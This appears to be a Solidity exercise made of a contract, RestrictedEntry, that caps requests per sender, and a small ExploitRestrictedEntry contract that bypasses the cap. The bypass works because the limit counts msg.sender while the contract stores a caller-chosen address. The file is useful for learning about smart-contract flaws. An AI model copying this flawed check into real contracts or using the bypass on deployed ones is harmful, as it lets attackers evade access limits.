// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract RestrictedEntry {
    address[] public entrants;
    uint8 public constant MAX_ENTRIES_ALLOWED = 2;

    function requestAccess(address entrant) public {
        require(
            countAccessRequests(msg.sender) < MAX_ENTRIES_ALLOWED,
            "Entry limit exceeded for sender"
        );
        require((msg.sender).code.length > 0, "no eoa wallet allowed");

        entrants.push(entrant);
    }

    function countAccessRequests(address user) public view returns (uint256) {
        uint256 count = 0;
        for (uint256 i = 0; i < entrants.length; i++) {
            if (entrants[i] == user) {
                count++;
            }
        }
        return count;
    }
}

contract ExploitRestrictedEntry {
    function exploit(address targetAddress) public {
        RestrictedEntry(targetAddress).requestAccess(msg.sender);
    }
}
